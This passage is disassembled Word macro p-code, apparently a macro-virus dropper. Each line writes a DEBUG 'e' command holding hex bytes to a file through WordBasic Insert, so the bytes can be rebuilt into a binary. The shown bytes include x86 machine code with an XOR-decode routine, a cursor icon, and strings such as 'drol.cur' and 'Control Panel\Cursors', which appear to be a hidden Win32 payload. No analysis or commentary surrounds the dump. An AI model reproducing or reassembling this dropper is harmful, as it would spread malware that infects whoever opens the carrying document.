' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #390:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #391:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #392:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #393:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #394:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #395:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #396:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #397:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #398:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #399:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #400:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19a0 00 00 00 00 00 00 64 72 6f 6c 2e 63 75 72 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #401:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19b0 00 02 00 01 00 20 20 02 00 00 00 00 00 30 01 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #402:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19c0 00 16 00 00 00 28 00 00 00 20 00 00 00 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #403:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19d0 00 01 00 01 00 00 00 00 00 00 02 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #404:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #405:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19f0 00 ff ff ff 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #406:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a00 00 00 00 00 00 00 05 28 00 00 05 28 00 00 05 28 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #407:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a10 00 00 07 f8 00 00 03 f0 00 00 03 f0 00 00 07 f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #408:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a20 00 00 07 38 00 00 0e 1c 00 00 0f 3c 00 00 1f 3e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #409:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a30 00 00 1f fe 00 00 1d ee 00 00 18 c6 00 00 1d ee "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #410:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a40 00 00 1f fe 00 00 0f fe 00 00 0f fc 00 00 0f fc "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #411:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a50 00 00 07 f8 00 00 07 f8 00 00 01 e0 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #412:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #413:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a70 00 00 00 00 00 ff ff ff fc ff ff ff f8 ff fd 2f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #414:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a80 f1 ff f8 07 e3 ff f0 03 c7 ff f0 03 8f ff f0 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #415:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a90 1f ff f0 02 3f ff f8 04 7f ff f8 00 ff ff f0 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #416:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1aa0 ff ff f0 03 ff ff e0 01 ff ff e0 01 ff ff c0 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #417:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ab0 ff ff c0 00 ff ff c0 00 ff ff c0 00 ff ff c0 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #418:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ac0 ff ff c0 00 ff ff c0 00 ff ff 80 01 ff ff 00 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #419:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ad0 ff ee 30 03 ff ec 70 03 ff c8 f8 07 ff c1 fe 1f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #420:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ae0 ff c3 ff ff ff 80 7f ff ff 81 ff ff ff 8f ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #421:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1af0 ff 7f ff ff ff 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #422:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b00 00 43 6f 6e 74 72 6f 6c 20 50 61 6e 65 6c 5c 43 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #423:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b10 75 72 73 6f 72 73 00 41 72 72 6f 77 00 60 8d bd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #424:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b20 3d 12 40 00 8d b5 0e 18 40 00 8b 06 03 c5 80 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #425:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b30 ff 74 24 57 50 ff 95 9d 11 40 00 83 f8 ff 74 11 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #426:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b40 50 8d 5f 2c 53 ff 95 f1 11 40 00 ff 95 c5 11 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #427:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b50 00 66 83 c6 04 eb d3 61 c3 60 b8 05 00 00 00 e8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #428:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b60 61 00 00 00 83 c0 03 bb 07 00 00 00 2b d8 8d bd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #429:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b70 9f 17 40 00 b0 2e aa b9 07 00 00 00 3b cb 76 10 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #430:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b80 b8 19 00 00 00 e8 3b 00 00 00 83 c0 61 aa e2 ec "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #431:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b90 b0 00 aa e2 e7 61 c3 50 8b 44 24 f8 01 85 c1 24 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #432:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ba0 40 00 58 c3 51 33 c9 8b 85 c1 24 40 00 66 b9 21 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #433:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bb0 00 03 c0 73 02 34 c5 e2 f8 89 85 c1 24 40 00 59 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #434:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bc0 c3 01 00 00 00 52 51 ba 00 00 00 00 50 e8 d2 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #435:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bd0 ff ff 59 f7 f1 92 59 5a c3 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #436:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #437:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #438:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #439:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #440:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #441:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #442:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #443:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
